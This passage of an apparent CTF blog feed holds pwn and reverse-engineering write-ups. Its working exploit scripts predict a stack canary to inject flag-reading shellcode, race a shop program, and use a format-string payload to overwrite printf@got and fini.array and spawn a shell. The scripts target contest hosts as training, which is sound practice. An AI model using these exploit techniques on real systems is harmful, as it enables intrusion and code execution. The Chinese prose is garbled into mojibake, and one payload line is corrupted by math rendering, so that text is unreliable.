data-num=\"22\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>ret_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x401257</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    seed <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">60</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    v1 <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>seed<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    v2 <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    v3 <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    canary_pre <span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v2 <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> v3 <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v2 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>v2 <span class=\"token operator\">>></span> <span class=\"token number\">48</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>v2 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">48</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    canary <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary_pre<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">:</span><span class=\"token number\">30</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token comment\"># r = process('./chal')</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.node.game.sycsec.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">31883</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    payload <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    payload <span class=\"token operator\">+=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token string\">'rax'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4040E0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    payload <span class=\"token operator\">+=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4040E0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    se<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4040E0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    sea<span class=\"token punctuation\">(</span><span class=\"token string\">b'tell me something:\\n'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    res <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>recvall<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">b'stack'</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr></table></figure><h2 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> re</h2>\n<h3 id=\"shiftjmp\"><a class=\"markdownIt-Anchor\" href=\"#shiftjmp\">#</a> shiftjmp</h3>\n<p>Ëä±Êåá‰ª§</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">33</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> rodata<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> i <span class=\"token operator\">^</span> <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"no\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yes\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">// rodata = SXAxS6jd8doTxBQ&#123;x\"Ma',27h,'csE-|El,o/&#123;^\\</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    rodata <span class=\"token operator\">=</span> <span class=\"token string\">\"SXAxS6jd8doTxBQ&#123;x\\\"Ma',27h,'csE-|El,o/&#123;^\\\\\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    flag <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>rodata<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>rodata<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> flag</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>get_flag<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"Âπ∏ËøêÊï∞Â≠ó\"><a class=\"markdownIt-Anchor\" href=\"#Âπ∏ËøêÊï∞Â≠ó\">#</a> Âπ∏ËøêÊï∞Â≠ó</h3>\n<p>Áõ¥Êé•ÂÜô‰∏™ËÑöÊú¨ÔºåÂæÄÁ®ãÂ∫èÂæ™ÁéØÂä†‰∏ÄËæìÂÖ•Êï∞Â≠óÔºåËÉΩÂæóÂà∞ flag</p>\n<h3 id=\"Á†çÊ†ë\"><a class=\"markdownIt-Anchor\" href=\"#Á†çÊ†ë\">#</a> Á†çÊ†ë</h3>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/13.png\" alt=\"image-20231030090452684\"></p>\n<p>key:Syclove</p>\n<p>Âä†ÂØÜÁÆóÊ≥ïÔºö</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/14.png\" alt=\"image-20231030090659388\"></p>\n<pre><code>002020171B360E362617042A2907261552332D0F3A271106330746173D0A3C382E2218\n</code></pre>\n<p>Ëß£È¢òËÑöÊú¨Ôºö</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">A0OWO0A</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">34</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        a1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> a2<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> a1</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>a1 <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">.</span>fromhex<span class=\"token punctuation\">(</span><span class=\"token string\">'002020171B360E362617042A2907261552332D0F3A271106330746173D0A3C382E2218'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>a2 <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token string\">b'Syclove'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>result <span class=\"token operator\">=</span> A0OWO0A<span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "http://example.com/2023/09/22/new-pwn/",
            "url": "http://example.com/2023/09/22/new-pwn/",
            "title": "new_pwn",
            "date_published": "2023-09-22T12:04:31.000Z",
            "content_html": "<h1 id=\"ËÆ∞ÂΩï‰∏§ÈÅìpwnÈ¢ò\"><a class=\"markdownIt-Anchor\" href=\"#ËÆ∞ÂΩï‰∏§ÈÅìpwnÈ¢ò\">#</a> ËÆ∞ÂΩï‰∏§ÈÅì PWN È¢ò</h1>\n<blockquote>\n<p>ÁªôÊñ∞ÁîüÂá∫È¢òÔºåÂá∫Á¥Ø‰∫ÜÔºåÈöè‰æøÁúã‰∫Ü‰∏§‰∏™ PWN È¢òÔºåÂèëÁé∞Ëøô‰∏§‰∏™ PWN ÈÉΩÂÄºÂæóËÆ∞ÂΩï‰∏Ä‰∏ã</p>\n</blockquote>\n<ul>\n<li>ONE</li>\n</ul>\n<h2 id=\"nisactf-2022shop_pwn\"><a class=\"markdownIt-Anchor\" href=\"#nisactf-2022shop_pwn\">#</a> [NISACTF 2022]shop_pwn</h2>\n<p>È¢òÁõÆÊ†áÁ≠æÔºö</p>\n<p><img data-src=\"/img/pwnlianxi/20230922180317483.png\" alt=\"20230922180317483\"></p>\n<blockquote>\n<p>pthread_create Â§öÁ∫øÁ®ãÁ´û‰∫â</p>\n</blockquote>\n<p><img data-src=\"/img/pwnlianxi/20230922180537307.png\" alt=\"20230922180537307\"></p>\n<p><strong>ÊâßË°åÁ®ãÂ∫èÂ¶Ç‰∏ãÔºö</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922180732045.png\" alt=\"20230922180732045\"></p>\n<p><strong>ÊîæÂÖ• IDA Áúã‰∏Ä‰∏ãÂÖ∑‰ΩìÁöÑÂáΩÊï∞Ôºö</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922180849649.png\" alt=\"20230922180849649\"></p>\n<p><strong>Áúã‰∏Ä‰∏ã‰∏ªË¶ÅÁöÑÂáΩÊï∞</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922181202034.png\" alt=\"20230922181202034\"></p>\n<p><img data-src=\"/img/pwnlianxi/20230922181325444.png\" alt=\"20230922181325444\"></p>\n<p><strong>ËÑöÊú¨Â¶Ç‰∏ãÔºö</strong></p>\n<blockquote>\n<p>ËøôÈáåÂà©Áî®‰∫Ü pthread_create ÂàõÂª∫ËøõÁ®ãÔºåÈÇ£‰πàÂ¶ÇÊûúÊàë‰ª¨Êåá‰ª§ÂèëÈÄÅÂæóÂø´ÁöÑËØùÔºåÈÇ£‰πàÂ∞±ÂèØ‰ª•ÂÆûÁé∞Á¨¨‰∏ÄÊ¨°ÂîÆÂçñÂäüËÉΩÊâßË°åÁöÑÊó∂ÂÄôÊ≠£Âú® unsleepÔºåÊé•ÁùÄÊâßË°åÁ¨¨‰∫åÊ¨°ÂîÆÂçñÂäüËÉΩÔºåÈÇ£‰πàÂ∞±ËÉΩÂçñÂá∫‰∏§Ê¨°ÂæóÂà∞ÂèØ‰ª•Ë¥≠‰π∞ flag ÁöÑÈáëÈí±‰∫Ü</p>\n</blockquote>\n<p><strong>pwntool ÁöÑ sendline ÂèëÈÄÅÊåá‰ª§ÂæàÂø´</strong></p>\n<pre><code>from pwn import *\ncontext(log_level='debug',arch='amd64', os='linux')\nr = remote('node5.anna.nssctf.cn',28929)\nr.sendline(&quot;3&quot;) \nr.sendline(&quot;0&quot;) \n\nr.sendline(&quot;3&quot;)\nr.sendline(&quot;0&quot;)  \n\nr.interactive()\n</code></pre>\n<p><strong>ÁªìÊûúÂ¶Ç‰∏ãÔºö</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922181643187.png\" alt=\"20230922181643187\"></p>\n<ul>\n<li>two</li>\n</ul>\n<h2 id=\"ciscn-2019Ë•øÂçópwn1\"><a class=\"markdownIt-Anchor\" href=\"#ciscn-2019Ë•øÂçópwn1\">#</a> [CISCN 2019 Ë•øÂçó] PWN1</h2>\n<blockquote>\n<p>ÂΩì <code>RELRO</code>  ‰øùÊä§‰∏∫ <code>NO RELRO</code>  ÁöÑÊó∂ÂÄôÔºå <code>init.array„ÄÅfini.array„ÄÅgot.plt</code>  ÂùáÂèØËØªÂèØÂÜôÔºõ‰∏∫ <code>PARTIAL RELRO</code>  ÁöÑÊó∂ÂÄôÔºå <code>ini.array„ÄÅfini.array</code>  ÂèØËØª‰∏çÂèØÂÜôÔºå <code>got.plt</code>  ÂèØËØªÂèØÂÜôÔºõ‰∏∫ <code>FULL RELRO</code>  Êó∂Ôºå <code>init.array„ÄÅfini.array„ÄÅgot.plt</code>  ÂùáÂèØËØª‰∏çÂèØÂÜô„ÄÇ</p>\n</blockquote>\n<blockquote>\n<p>Á®ãÂ∫èÂú®Âä†ËΩΩÁöÑÊó∂ÂÄôÔºå‰ºö‰æùÊ¨°Ë∞ÉÁî® <code>init.array</code>  Êï∞ÁªÑ‰∏≠ÁöÑÊØè‰∏Ä‰∏™ÂáΩÊï∞ÊåáÈíàÔºåÂú®ÁªìÊùüÁöÑÊó∂ÂÄôÔºå‰æùÊ¨°Ë∞ÉÁî® <code>fini.array</code>  ‰∏≠ÁöÑÊØè‰∏Ä‰∏™ÂáΩÊï∞ÊåáÈíà</p>\n</blockquote>\n<blockquote>\n<p>ÂΩìÁ®ãÂ∫èÂá∫Áé∞Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÔºå‰ΩÜÊòØÈúÄË¶ÅÂÜô‰∏§Ê¨°ÊâçËÉΩÂÆåÊàêÊîªÂáªÔºåËøô‰∏™Êó∂ÂÄôÂèØ‰ª•ËÄÉËôëÊîπÂÜô <code>fini.array</code>  ‰∏≠ÁöÑÂáΩÊï∞ÊåáÈíà‰∏∫ <code>main</code>  ÂáΩÊï∞Âú∞ÂùÄÔºåÂèØ‰ª•ÂÜçÊâßË°å‰∏ÄÊ¨° <code>main</code>  ÂáΩÊï∞„ÄÇ‰∏ÄËà¨Êù•ËØ¥ÔºåËøô‰∏™Êï∞ÁªÑÁöÑÈïøÂ∫¶‰∏∫ <code>1</code> Ôºå‰πüÂ∞±ÊòØËØ¥Âè™ËÉΩÂÜô‰∏Ä‰∏™Âú∞ÂùÄ„ÄÇ</p>\n</blockquote>\n<p><img data-src=\"/img/pwnlianxi/20230922182614061.png\" alt=\"20230922182614061\"></p>\n<p>32 ‰ΩçÁ®ãÂ∫è‰øÆÊîπ got Ë°®„ÄÇ</p>\n<p><strong>ÊâßË°åÁ®ãÂ∫èÂèÇÁúãÂÅèÁßªÔºö</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922183714065.png\" alt=\"20230922183714065\"></p>\n<p><strong>Áúã‰∏Ä‰∏ã IDA:</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922184018564.png\" alt=\"20230922184018564\"></p>\n<p><img data-src=\"/img/pwnlianxi/20230922184142420.png\" alt=\"20230922184142420\"></p>\n<p><strong>Âà©Áî®ÊÄùË∑ØÔºö</strong></p>\n<p>ÈÄöËøáÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÂéª‰øÆÊîπ printf_gotÔºå‰øÆÊîπ‰∏∫ system„ÄÇ‰ΩÜÊòØÁ®ãÂ∫èÂè™ËÉΩÊâßË°å‰∏ÄÊ¨°ÔºåÊâÄ‰ª•‰øÆÊîπÂÆåÂêéÔºåÁ®ãÂ∫è‰ºöÈÄÄÂá∫„ÄÇ</p>\n<p>‰ΩÜÊòØÂ¶ÇÊûúÂ¶Ç‰∏ãÂõæÊâÄÁ§∫</p>\n<p><img data-src=\"/img/pwnlianxi/20230922184525768.png\" alt=\"20230922184525768\"></p>\n<p>Êàë‰ª¨Â∞±ÂèØ‰ª•Âéª‰øÆÊîπ <code>fini.array</code> , Â∞ÜÂÖ∂ÂèÇÊï∞ 1ÔºåÁªôË¶ÜÂÜôÊàê mainÔºåÈÇ£‰πàÁ®ãÂ∫èÂú®ÈÄÄÂá∫ÂêéÂ∞±‰ºöÂÜçÊ¨°ÊâßË°å main ÂáΩÊï∞„ÄÇ</p>\n<p><strong>payloadÔºö</strong></p>\n<blockquote>\n<p>payload = b&quot;%2052c%13<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>h</mi><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">hn%31692c%14</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">n</span></span></span></span>hn%356c%15$hn&quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)</p>\n</blockquote>\n<p>ÈÄöËøá gdb ÂéªÁúã‰∏ÄÁúº payload ËøõÂÖ•Á®ãÂ∫èÁöÑÊÉÖÂÜµÔºö</p>\n<p><img data-src=\"/img/pwnlianxi/20230922185014496.png\" alt=\"20230922185014496\"></p>\n<p>ÂΩìËØªÂÖ• pyload Êó∂ÁöÑÊÉÖÂÜµ</p>\n<p>ËøôÊó∂Á®ãÂ∫èËØªÂÖ• payload„ÄÇÁé∞Âú® got Ë°®È°πÊåáÂêëÁöÑËøòÊòØ printf_plt„ÄÇ</p>\n<p><img data-src=\"/img/pwnlianxi/20230922191625014.png\" alt=\"20230922191625014\"></p>\n<p>ÂΩìÊâßË°åÂà∞ printf ÂáΩÊï∞Êó∂Ôºåprintf_got ‰øÆÊîπ‰∏∫ system  fini_array ÁöÑÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞‰øÆÊîπ‰∏∫ main</p>\n<p>ÂΩìÊàë‰ª¨Á®ãÂ∫èÁªìÊùüÊó∂ÔºåÂ∞±‰ºöÂÜçÊ¨°Ë∑≥ËΩ¨Âà∞ main ÂáΩÊï∞ÂÖ•Âè£ÔºåÂú®ËØªÂÖ• /bin/shÔºåÊé•ÁùÄ‰ºöÂú®Ë∞ÉÁî® printf ÂáΩÊï∞Ôºå‰ºöÊâßË°å system (/bin/sh)Ôºå‰ªéËÄåËé∑Âèñ shell</p>\n<p><strong>exp Â¶Ç‰∏ãÔºö</strong></p>\n<pre><code>from pwn import *\nr = remote('node5.anna.nssctf.cn',28467)\n# r = gdb.debug(&quot;./XNPWN1&quot;)\n# ÂæÄfini.array[0]ÂÜômain@text, printf@gotÂÜôsystem@plt\npayload = b&quot;%2052c%13$hn%31692c%14$hn%356c%15$hn&quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)\nr.recvline()\n\nr.sendline(payload)\n\nr.sendline(&quot;/bin/sh&quot;)\nr.interactive()\n</code></pre>\n",
            "tags": [
                "Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤",
                "gotË°®"
            ]
        },
        {
            "id": "http://example.com/2023/09/22/picture/new-pwn/",
            "url": "http://example.com/2023/09/22/picture/new-pwn/",
            "title": "new_pwn",
            "date_published": "2023-09-22T11:51:06.000Z",
